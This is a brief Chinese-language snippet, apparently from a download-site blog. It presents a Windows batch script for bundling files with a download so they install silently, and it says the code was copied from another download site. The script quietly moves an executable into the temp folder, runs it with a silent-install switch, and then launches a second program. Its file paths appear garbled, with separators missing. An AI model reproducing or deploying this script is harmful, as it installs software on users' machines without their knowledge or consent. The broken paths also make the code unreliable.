有时候下载内容需要接一些静默安装额文件，其实这个代码就是从别的下载站扒来的



@ECHO OFF
if not exist ".jb51.exe" GOTO END
move ".jb51.exe" "%temp%jb51.exe"
start "qq" "%temp%jb51.exe" "/S"
:END
start "m" ".binXLacc.exe"
exit
